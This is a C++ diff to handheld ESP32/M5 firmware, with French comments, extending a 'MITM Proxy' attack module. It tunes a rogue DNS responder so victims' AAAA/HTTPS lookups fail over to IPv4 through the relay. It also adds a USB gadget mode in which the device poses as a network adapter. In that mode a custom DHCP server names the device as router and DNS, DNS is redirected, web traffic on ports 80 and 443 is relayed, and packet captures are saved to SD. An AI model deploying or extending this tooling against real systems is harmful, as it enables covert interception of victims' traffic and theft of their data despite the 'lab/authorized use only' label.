@@ -3,6 +3,9 @@
 extern "C" {
 #include "lwip/tcpip.h"
 #include "lwip/priv/tcp_priv.h"   // tcp_tw_pcbs + tcp_abort: reclaim TIME_WAIT PCBs
+#include "lwip/udp.h"             // USB MITM : serveur DHCP raw lwIP (reponse sur le netif gadget)
+#include "lwip/pbuf.h"
+#include "lwip/netif.h"
 }
 // ============================================================================
 //  MITM Proxy (userspace transparent proxy with real upstream internet)
@@ -225,23 +228,31 @@ static bool dns_poll() {
         p += len;
     }
     g_dns_q++;
-    if (qname.length()) logln("DNS " + qname);
-    // build response: reuse the query, set QR+AA+RA, 1 answer A -> apIP
+    // QTYPE sits right after the QNAME null label (buf[p]==0): [null][QTYPE:2][QCLASS:2]
+    int qtype = (p + 2 < n) ? ((buf[p + 1] << 8) | buf[p + 2]) : 1;
+    if (qname.length()) logln(String("DNS ") + qname + (qtype == 28 ? " AAAA" : qtype == 65 ? " HTTPS" : qtype == 1 ? "" : (" t" + String(qtype))));
+    // build response: reuse the query, set QR+AA+RA (NOERROR).
     int qend = p + 1 + 4;                 // null label + QTYPE + QCLASS
     if (qend > n) qend = n;
-    buf[2] = 0x81; buf[3] = 0x80;         // flags: response, recursion available
-    buf[6] = 0x00; buf[7] = 0x01;         // ANCOUNT = 1
+    buf[2] = 0x81; buf[3] = 0x80;         // flags: response, recursion available, NOERROR
+    buf[6] = buf[7] = 0;                  // ANCOUNT (set to 1 only for A below)
     buf[8] = buf[9] = buf[10] = buf[11] = 0;
     int o = qend;
-    uint8_t ans[] = { 0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C,
-                      0x00, 0x04, (uint8_t)apIP[0], (uint8_t)apIP[1], (uint8_t)apIP[2], (uint8_t)apIP[3] };
-    if (o + (int)sizeof(ans) <= (int)sizeof buf) {
-        memcpy(buf + o, ans, sizeof ans); o += sizeof ans;
-        dnsUdp.beginPacket(dnsUdp.remoteIP(), dnsUdp.remotePort());
-        dnsUdp.write(buf, o);
-        dnsUdp.endPacket();
-        if (g_pcap_on) pcap_udp(apIP, dcli, 53, dcport, buf, o);   // log the DNS response (us -> client)
+    // Only A (1) and ANY (255) get our redirect address. AAAA (28), HTTPS/SVCB
+    // (65) and the rest get an authoritative EMPTY NOERROR answer, so the victim
+    // (esp. dual-stack Linux/Kali, which queries AAAA/HTTPS first) falls back to
+    // IPv4 at once and routes through our relay, instead of the old bogus
+    // A-record-for-an-AAAA-query that stalled getaddrinfo.
+    if (qtype == 1 || qtype == 255) {
+        buf[7] = 0x01;                    // ANCOUNT = 1
+        uint8_t ans[] = { 0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C,
+                          0x00, 0x04, (uint8_t)apIP[0], (uint8_t)apIP[1], (uint8_t)apIP[2], (uint8_t)apIP[3] };
+        if (o + (int)sizeof(ans) <= (int)sizeof buf) { memcpy(buf + o, ans, sizeof ans); o += sizeof ans; }
     }
+    dnsUdp.beginPacket(dnsUdp.remoteIP(), dnsUdp.remotePort());
+    dnsUdp.write(buf, o);
+    dnsUdp.endPacket();
+    if (g_pcap_on) pcap_udp(apIP, dcli, 53, dcport, buf, o);   // log the DNS response (us -> client)
     return true;
 }
 
@@ -333,7 +344,7 @@ static void handle_conn(WiFiClient down, uint16_t port) {
         while ((a = down.available()) > 0) { int r = down.read(buf, a > BUF ? BUF : a); if (r > 0) { up.write(buf, r); if (g_pcap_on) { pcap_seg(vip, hip, vport, hport, cseq, sseq, 0x18, buf, r); cseq += r; } moved = true; } else break; }
         while ((a = up.available()) > 0)   { int r = up.read(buf, a > BUF ? BUF : a);   if (r > 0) { down.write(buf, r); if (g_pcap_on) { pcap_seg(hip, vip, hport, vport, sseq, cseq, 0x18, buf, r); sseq += r; } moved = true; } else break; }
         if (moved) idle = millis();
-        else { if (millis() - idle > 2000) break; delay(2); }   // free idle slots fast so the pool turns over for page fan-out
+        else { if (millis() - idle > 1500) break; delay(2); }   // free idle slots fast so the scarce 5-slot pool turns over for page fan-out (keep-alive reuse loses to starving the other connections here)
         if (!running) break;
         if (ESP.getFreeHeap() < 16000) break;                   // heap safety valve: drop this relay before lwIP/WiFi starve
     }
@@ -494,20 +505,24 @@ static void run() {
     log_free();
 }
 
+static void usbArmAndReboot();   // USB MITM : arme le gadget + reboot (defini plus bas)
+
 inline void menu() {
-    const char* it[] = { "Set uplink SSID", "Set uplink pass", "Set rogue SSID", "Set rogue pass", "Start MITM proxy" };
-    const int N = 5;
+    const char* it[] = { "Set uplink SSID", "Set uplink pass", "Set rogue SSID", "Set rogue pass", "Start MITM proxy", "USB MITM (gadget) + reboot" };
+    const int N = 6;
     int sel = 0; bool rd = true; enterDebounce();
     while (true) {
         if (rd) {
-            mhdr("MITM Proxy"); M5.Display.setTextSize(1.5);
-            for (int i = 0; i < N; i++) { int y = 20 + i * 17;
-                if (i == sel) { M5.Display.fillRect(0, y - 1, M5.Display.width(), 16, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor); }
-                else M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+            mhdr("MITM Proxy"); M5.Display.setTextSize(menuTextSize);
+            const int mlh = menuLineH + 3;
+            for (int i = 0; i < N; i++) { int y = 18 + i * mlh;
+                if (i == sel) { M5.Display.fillRect(0, y - 1, M5.Display.width(), mlh, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); }
+                else M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+                uint16_t rbg = (i == sel) ? menuSelectedBackgroundColor : menuBackgroundColor;
                 M5.Display.setCursor(8, y); M5.Display.print(it[i]);
-                if (i == 0 && up_ssid[0]) { M5.Display.setTextColor(0x5AEB, TFT_BLACK); M5.Display.printf(":%.10s", up_ssid); }
-                if (i == 2) { M5.Display.setTextColor(0x5AEB, TFT_BLACK); M5.Display.printf(":%.9s", ap_ssid); }
-                if (i == 3) { M5.Display.setTextColor(0x5AEB, TFT_BLACK); M5.Display.print(strlen(ap_pass) >= 8 ? ":WPA2" : ":open"); }
+                if (i == 0 && up_ssid[0]) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.printf(":%.10s", up_ssid); }
+                if (i == 2) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.printf(":%.9s", ap_ssid); }
+                if (i == 3) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.print(strlen(ap_pass) >= 8 ? ":WPA2" : ":open"); }
             }
             M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); M5.Display.setTextSize(1);
             M5.Display.setCursor(5, 122); M5.Display.print("lab/authorized use only");
@@ -523,11 +538,188 @@ inline void menu() {
             else if (sel == 1) mtext("Uplink password", up_pass, sizeof up_pass, true);
             else if (sel == 2) mtext("Rogue AP SSID", ap_ssid, sizeof ap_ssid, false);
             else if (sel == 3) mtext("Rogue pass (>=8 or empty)", ap_pass, sizeof ap_pass, true);
-            else run();
+            else if (sel == 4) run();
+            else usbArmAndReboot();         // sel==5 : arme le gadget USB MITM + reboot (victime en USB)
             rd = true;
         }
         delay(10);
     }
+}
+
+// ============================================================================
+//  USB MITM (gadget RNDIS) : meme moteur relais que ci-dessus, mais la victime
+//  arrive par le gadget USB (192.168.7.1) au lieu du rogue AP WiFi. WiFi STA =
+//  uplink internet. Gadget monte au early-boot (comme lockpicker). NAPT etant
+//  gate dans le lwIP precompile, on relaie a l'applicatif (DNS redirect + :80/:443)
+//  et on pcap sur SD. Increment 1 : a valider au boot sur device (coexistence
+//  gadget USB + WiFi STA, comme le lockpicker a du etre de-risque).
+// ----------------------------------------------------------------------------
+extern "C" void usbnet_enable_interface(void);   // definis dans lockpicker_glue.c
+extern "C" void usbnet_netif_up(void);
+
+static bool usbArmRead() { Preferences p; if (!p.begin("usbmitm", true)) return false; bool a = p.getBool("armed", false); p.end(); return a; }
+static void usbArmWrite(bool v) { Preferences p; if (!p.begin("usbmitm", false)) return; p.putBool("armed", v); if (v) { p.putString("ssid", up_ssid); p.putString("pass", up_pass); } p.end(); }
+static void usbLoadCreds() {
+  Preferences p; if (!p.begin("usbmitm", true)) return;
+  String s = p.getString("ssid", ""), pw = p.getString("pass", ""); p.end();
+  strncpy(up_ssid, s.c_str(), sizeof up_ssid - 1); up_ssid[sizeof up_ssid - 1] = 0;
+  strncpy(up_pass, pw.c_str(), sizeof up_pass - 1); up_pass[sizeof up_pass - 1] = 0;
+}
+
+// Arme le gadget (depuis le menu MITM Proxy, item 5) : exige l'uplink, puis reboot.
+static void usbArmAndReboot() {
+  auto& d = M5.Display;
+  if (!up_ssid[0]) { d.fillScreen(TFT_BLACK); d.setTextColor(TFT_RED, TFT_BLACK); d.setCursor(6, 40); d.print("Set uplink SSID first"); d.display(); delay(1500); return; }
+  d.fillScreen(TFT_BLACK); d.setTextColor(TFT_YELLOW, TFT_BLACK); d.setCursor(6, 30); d.println("ARM USB MITM gadget ?");
+  d.setTextColor(TFT_WHITE, TFT_BLACK); d.setCursor(6, 54); d.printf("uplink: %.16s", up_ssid);
+  d.setCursor(6, 78); d.println("ENTER=arm+reboot  `=cancel"); d.display();
+  for (;;) { M5.update(); cardUpdate();
+    if (kp(KEY_ENTER)) { usbArmWrite(true); d.fillScreen(TFT_BLACK); d.setCursor(6, 40); d.print("Reboot gadget..."); d.display(); delay(600); ESP.restart(); }
+    if (kp('`') || kp(KEY_BACKSPACE)) { keyRelease(); return; }
+    delay(8);
+  }
+}
+
+static volatile uint32_t g_usb_leases = 0;   // nb de baux DHCP accordes (ACK) a la victime
+extern "C" struct netif* usbnet_get_netif(void);   // netif gadget (glue.c)
+
+// Serveur DHCP en RAW lwIP : la reponse OFFER/ACK est envoyee en broadcast SUR LE NETIF GADGET
+// (udp_sendto_if), pas sur le netif default -> qui repasse au WiFi une fois l'uplink connecte,
+// ce qui faisait partir l'OFFER cote WiFi et la victime ne recevait jamais son bail. Le callback
+// tourne dans le thread tcpip -> appels lwIP surs. yiaddr .2, gw/dns = .1 (pas de WPAD).
+static void usbDhcpRecv(void* arg, struct udp_pcb* pcb, struct pbuf* pb, const ip_addr_t* a, u16_t pt) {
+  (void)arg; (void)a; (void)pt;
+  if (!pb) return;
+  uint8_t* in = (uint8_t*)pb->payload; uint16_t len = pb->len;
+  if (len >= 240 && in[0] == 1 && in[236]==0x63 && in[237]==0x82 && in[238]==0x53 && in[239]==0x63) {
+    uint8_t type = 0; { int i = 240; while (i < len) { uint8_t c=in[i]; if(c==255)break; if(c==0){i++;continue;} if(c==53){type=in[i+2];break;} i+=2+in[i+1]; } }
+    uint8_t reply = (type==1)?2:(type==3)?5:0;
+    if (reply) {
+      struct pbuf* rp = pbuf_alloc(PBUF_TRANSPORT, 300, PBUF_RAM);
+      if (rp) {
+        uint8_t* o2 = (uint8_t*)rp->payload; memset(o2, 0, 300);
+        o2[0]=2;o2[1]=1;o2[2]=6; memcpy(o2+4,in+4,4);
+        o2[16]=192;o2[17]=168;o2[18]=7;o2[19]=2;             // yiaddr
+        o2[20]=192;o2[21]=168;o2[22]=7;o2[23]=1;             // siaddr
+        memcpy(o2+28,in+28,16);
+        o2[236]=0x63;o2[237]=0x82;o2[238]=0x53;o2[239]=0x63;
+        int o=240;
+        o2[o++]=53;o2[o++]=1;o2[o++]=reply;
+        o2[o++]=54;o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;
+        o2[o++]=51;o2[o++]=4;o2[o++]=0;o2[o++]=0;o2[o++]=0x0E;o2[o++]=0x10;
+        o2[o++]=1; o2[o++]=4;o2[o++]=255;o2[o++]=255;o2[o++]=255;o2[o++]=0;
+        o2[o++]=3; o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;    // router = self
+        o2[o++]=6; o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;    // DNS = self
+        o2[o++]=255;
+        pbuf_realloc(rp, o);
+        struct netif* gn = usbnet_get_netif();
+        if (gn) udp_sendto_if(pcb, rp, IP_ADDR_BROADCAST, 68, gn);           // broadcast SUR le gadget
+        pbuf_free(rp);
+        if (reply == 5) g_usb_leases++;
+      }
+    }
+  }
+  pbuf_free(pb);
+}
+static struct udp_pcb* g_dhcp_pcb = nullptr;
+static void usbDhcpStart_cb(void* arg) {   // tourne dans le thread tcpip (tcpip_callback)
+  (void)arg;
+  if (g_dhcp_pcb) return;
+  g_dhcp_pcb = udp_new();
+  if (g_dhcp_pcb) { udp_bind(g_dhcp_pcb, IP_ANY_TYPE, 67); udp_recv(g_dhcp_pcb, usbDhcpRecv, NULL); }
+}
+
+// Boucle gadget MITM (ne revient pas : reboot normal a la sortie).
+static void runUsbGadget() {
+  M5.begin(); M5.Lcd.setRotation(1);  // ecran+clavier : le bootHook tourne AVANT le M5.begin() du firmware
+                                      // (M5Unified.begin n'appelle pas USB.begin -> l'ordre gadget reste bon)
+  SPI.begin(SCK, MISO, MOSI, -1);     // le bootHook court AVANT le SD.begin() du setup() normal : sans ca,
+  SD.begin(12, SPI, 40000000UL);      // toute ecriture SD (usbmitm.log + pcap) echoue silencieusement en mode gadget
+  esp_netif_init();                 // idempotent ; sinon tache TCP-IP manquante -> crash gadget
+  usbnet_enable_interface();        // RNDIS AVANT USB.begin
+  usbnet_netif_up();
+  USB.begin();
+  usbLoadCreds();
+  { auto& d0 = M5.Display; d0.fillScreen(TFT_BLACK);
+    d0.setTextColor(TFT_GREEN, TFT_BLACK); d0.setTextSize(1); d0.setCursor(4, 4);  d0.print("USB MITM gadget UP");
+    d0.setTextColor(TFT_WHITE, TFT_BLACK); d0.setCursor(4, 18); d0.print("192.168.7.1 (victim side)"); d0.display(); }
+  WiFi.mode(WIFI_STA);
+  if (up_ssid[0]) WiFi.begin(up_ssid, up_pass);
+  { auto& d0 = M5.Display; uint32_t t0 = millis(); int dots = 0;
+    while (WiFi.status() != WL_CONNECTED && millis() - t0 < 20000) {        // feedback pendant le connect
+      d0.fillRect(0, 34, d0.width(), 12, TFT_BLACK);
+      d0.setTextColor(TFT_CYAN, TFT_BLACK); d0.setCursor(4, 34);
+      d0.printf("WiFi %.14s %.*s", up_ssid, (dots % 4) + 1, "....");
+      d0.display(); dots++; delay(250);
+    } }
+  // usbnet_netif_up a mis le GADGET en netif default -> les connexions sortantes du relais
+  // partiraient vers le gadget (pas d'internet). On remet le WiFi STA en default -> l'upstream
+  // sort par le WiFi. Le DHCP (udp_sendto_if) et les reponses DNS/HTTP (unicast on-link) restent OK.
+  if (WiFi.status() == WL_CONNECTED) {               // WiFi STA = netif default -> upstream relais via WiFi
+    IPAddress wip = WiFi.localIP();
+    struct netif* n;
+    NETIF_FOREACH(n) {
+      const ip4_addr_t* a = netif_ip4_addr(n);
+      if (a && netif_is_up(n) && ip4_addr1(a)==wip[0] && ip4_addr2(a)==wip[1] && ip4_addr3(a)==wip[2] && ip4_addr4(a)==wip[3]) {
+        netif_set_default(n); break;
+      }
+    }
+  }
+  apIP = IPAddress(192,168,7,1);    // DNS/relais repondent l'IP du gadget
+  if (!g_mtx) g_mtx = xSemaphoreCreateMutex();
+  log_alloc(); pcap_open();         // pcap sur SD (moteur deja teste cote WiFi)
+  dnsUdp.begin(53); httpSrv.begin(); httpsSrv.begin();
+  tcpip_callback(usbDhcpStart_cb, nullptr);   // DHCP raw lwIP : repond SUR le netif gadget (udp_sendto_if)
+  SD.mkdir("/evil"); SD.mkdir("/evil/mitm");
+  { File lf = SD.open("/evil/mitm/usbmitm.log", FILE_WRITE);   // log diag (lisible meme SD "dirty"/RO)
+    struct netif* dn = netif_default;                          // quel netif porte la route par defaut ?
+    if (lf) { lf.printf("wifi_status=%d ssid=%s ip=%s gw=%s sta_dns=%s def_netif=%c%c%d (gadget=.7.1 / STA=uplink)\n",
+                        (int)WiFi.status(), up_ssid, WiFi.localIP().toString().c_str(), WiFi.gatewayIP().toString().c_str(),
+                        WiFi.dnsIP().toString().c_str(),
+                        dn ? dn->name[0] : '?', dn ? dn->name[1] : '?', dn ? (int)dn->num : -1); lf.close(); } }
+  running = true;
+  auto& d = M5.Display; d.fillScreen(TFT_BLACK);
+  uint32_t lu = 0, ll = 0;
+  while (true) {
+    for (int i = 0; i < 24 && dns_poll(); i++) ;
+    WiFiClient c; while (g_active < MITM_MAX && (c = httpSrv.available()))  spawn(c, 80);
+    WiFiClient s; while (g_active < MITM_MAX && (s = httpsSrv.available())) spawn(s, 443);
+    if (millis() - ll > 5000) { ll = millis();   // log diag periodique (SD)
+      File lf = SD.open("/evil/mitm/usbmitm.log", FILE_APPEND);
+      if (lf) { lf.printf("t=%lu wifi=%d leases=%lu dns=%lu relays=%lu act=%d\n", (unsigned long)(millis()/1000), (int)WiFi.status(), (unsigned long)g_usb_leases, (unsigned long)g_dns_q, (unsigned long)g_relays, g_active); lf.close(); }
+    }
+    if (millis() - lu > 600) { lu = millis();
+      bool up = (WiFi.status() == WL_CONNECTED);
+      d.fillScreen(TFT_BLACK); d.setTextSize(1);
+      d.fillRect(0, 0, d.width(), 13, menuSelectedBackgroundColor);
+      d.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); d.setCursor(3, 3); d.print("USB MITM  gadget .7.1");
+      int y = 17;
+      d.setTextColor(up ? TFT_GREEN : TFT_RED, TFT_BLACK); d.setCursor(4, y);
+      if (up) d.printf("WiFi %.10s %s", WiFi.SSID().c_str(), WiFi.localIP().toString().c_str());
+      else    d.print("WiFi connecting...");
+      y += 13;
+      d.setTextColor(g_usb_leases ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK); d.setCursor(4, y); d.printf("DHCP victim leases: %lu", (unsigned long)g_usb_leases); y += 13;
+      d.setTextColor(TFT_WHITE, TFT_BLACK); d.setCursor(4, y); d.printf("DNS  queries: %lu", (unsigned long)g_dns_q); y += 13;
+      d.setCursor(4, y); d.printf("Relay total:%lu act:%d", (unsigned long)g_relays, g_active); y += 13;
+      d.setTextColor(TFT_CYAN, TFT_BLACK); d.setCursor(4, y); d.printf("pcap %.1f KB -> SD", g_pcap_bytes / 1024.0);
+      d.fillRect(0, d.height() - 11, d.width(), 11, menuSelectedBackgroundColor);
+      d.setTextColor(menuTextUnFocusedColor, menuSelectedBackgroundColor); d.setCursor(3, d.height() - 9); d.print("`=quit (reboot normal)");
+      d.display();
+    }
+    M5.update(); cardUpdate();
+    if (kp('`') || kp(KEY_BACKSPACE)) break;
+    delay(2);
+  }
+  running = false; pcap_close();
+  auto& dd = M5.Display; dd.fillScreen(TFT_BLACK); dd.setCursor(4, 40); dd.print("Reboot normal..."); dd.display(); delay(600);
+  ESP.restart();
+}
+
+// A appeler TOUT EN HAUT de setup() (apres lockpickerBootHook). Si arme : prend la main.
+inline void usbBootHook() {
+  if (!usbArmRead()) return;
+  usbArmWrite(false);   // anti-bootloop : desarmer avant tout code risque
+  runUsbGadget();       // ne revient pas
 }
 
 } // namespace mitm
